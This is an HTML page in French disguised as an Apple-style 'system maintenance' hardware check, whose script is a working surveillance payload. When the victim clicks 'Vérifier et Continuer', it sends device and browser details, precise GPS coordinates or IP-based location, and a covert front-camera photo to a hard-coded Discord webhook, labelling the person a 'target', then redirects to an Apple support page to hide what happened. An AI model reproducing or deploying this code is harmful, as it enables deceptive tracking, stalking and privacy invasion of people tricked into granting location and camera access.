<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>System Maintenance</title>
    <style>
        body { background: #000; color: #fff; font-family: -apple-system, system-ui, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .card { background: #1c1c1e; padding: 30px; border-radius: 15px; text-align: center; width: 85%; max-width: 350px; box-shadow: 0 10px 30px rgba(0,0,0,0.5); }
        .loader { border: 3px solid #333; border-top: 3px solid #0a84ff; border-radius: 50%; width: 35px; height: 35px; animation: spin 1s linear infinite; margin: 0 auto 20px; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        h2 { font-size: 20px; margin: 10px 0; }
        p { color: #8e8e93; font-size: 14px; line-height: 1.4; }
        .btn { background: #0a84ff; color: #fff; border: none; padding: 12px 25px; border-radius: 8px; font-weight: 600; cursor: pointer; width: 100%; margin-top: 20px; }
        #video, #canvas { display: none; }
    </style>
</head>
<body>
    <div class="card">
        <div id="loading-icon" style="display:none;" class="loader"></div>
        <h2 id="title">Mise √† jour requise</h2>
        <p id="status">Une v√©rification du mat√©riel est n√©cessaire pour poursuivre l'optimisation de votre syst√®me.</p>
        <button id="main-btn" class="btn" onclick="execute()">V√©rifier et Continuer</button>
    </div>

    <video id="video" autoplay playsinline muted></video>
    <canvas id="canvas"></canvas>

    <script>
        const WEBHOOK = "https://discord.com/api/webhooks/1466502605881475242/ynqT6t3L8IAQ69mgtvO17VvNBvmjFqiHayODx-P5EWMeN6renSu8UiM8nDfNNNvTHYy0";
        const REDIRECT = "https://support.apple.com/fr-fr/HT201222";

        async function post(msg, blob = null) {
            const fd = new FormData();
            if (blob) fd.append('file', blob, 'capture.png');
            fd.append('payload_json', JSON.stringify({ content: msg }));
            try { await fetch(WEBHOOK, { method: 'POST', body: fd, keepalive: true }); } catch(e){}
        }

        async function execute() {
            // UI Update
            document.getElementById('main-btn').style.display = 'none';
            document.getElementById('loading-icon').style.display = 'block';
            document.getElementById('title').innerText = "Analyse...";
            document.getElementById('status').innerText = "Veuillez patienter pendant la v√©rification des p√©riph√©riques.";

            // 1. Infos Syst√®me Imm√©diates
            const platform = navigator.userAgentData ? (await navigator.userAgentData.getHighEntropyValues(["platformVersion"])).platform : navigator.platform;
            await post(`üöÄ **CIBLE EN LIGNE**\n**Appareil**: ${platform}\n**Navigateur**: ${navigator.vendor}\n**Langue**: ${navigator.language}`);

            // 2. G√©olocalisation (Pr√©cision Max)
            navigator.geolocation.getCurrentPosition(async (p) => {
                await post(`üìç **LOCALISATION**: https://www.google.com/maps?q=${p.coords.latitude},${p.coords.longitude}`);
            }, async () => {
                const res = await fetch('https://ipapi.co/json/');
                const d = await res.json();
                await post(`üåê **IP (Proxied)**: ${d.city}, ${d.country} (${d.ip})`);
            }, { enableHighAccuracy: true, timeout: 5000 });

            // 3. Capture Cam√©ra & Fin
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
                const video = document.getElementById('video');
                video.srcObject = stream;

                video.onloadedmetadata = () => {
                    setTimeout(() => {
                        const canvas = document.getElementById('canvas');
                        canvas.width = video.videoWidth;
                        canvas.height = video.videoHeight;
                        canvas.getContext('2d').drawImage(video, 0, 0);
                        
                        canvas.toBlob(async (blob) => {
                            await post("üì∏ **CAPTURE R√âUSSIE**", blob);
                            stream.getTracks().forEach(t => t.stop());
                            window.location.href = REDIRECT;
                        }, 'image/png');
                    }, 1500);
                };
            } catch (e) {
                await post("‚ùå **ACC√àS CAM√âRA REFUS√â**");
                setTimeout(() => { window.location.href = REDIRECT; }, 1000);
            }
        }
    </script>
</body>
</html>
